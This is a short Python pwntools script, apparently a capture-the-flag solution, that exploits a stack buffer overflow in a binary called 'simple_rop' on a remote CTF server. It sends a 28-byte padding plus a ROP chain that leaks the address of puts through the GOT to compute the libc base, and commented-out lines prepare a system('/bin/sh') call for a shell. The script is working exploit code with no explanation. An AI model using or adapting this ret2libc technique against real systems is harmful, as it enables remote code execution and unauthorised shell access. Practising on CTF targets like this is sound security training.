#!/usr/bin/python3

from pwn import *

elf = ELF("simple_rop")
libc = elf.libc

libc.address = 0xf7d0ba40
# libc.address = 0xf7dcb000

rop = ROP([elf, libc])

# bin_sh = next(libc.search(b"/bin/sh\x00"))
# system = libc.sym["system"]

# rop.call(system, [bin_sh])

rop.call(elf.symbols["puts"], [elf.got["puts"]])
rop.call(elf.symbols["main"])

offset = 28
payload = b"A" * offset + rop.chain()

DEBUG = False

if DEBUG:
    p = elf.process()

else:
    p = remote('ctf-fsi.fe.up.pt', 7008)

p.recvuntil(b"\n", drop=True)
p.sendline(payload)
# p.interactive()

puts_address = u32(p.recvuntil(b"\n")[:4])
libc_address = puts_address - elf.libc.symbols["puts"]

print(hex(libc_address))
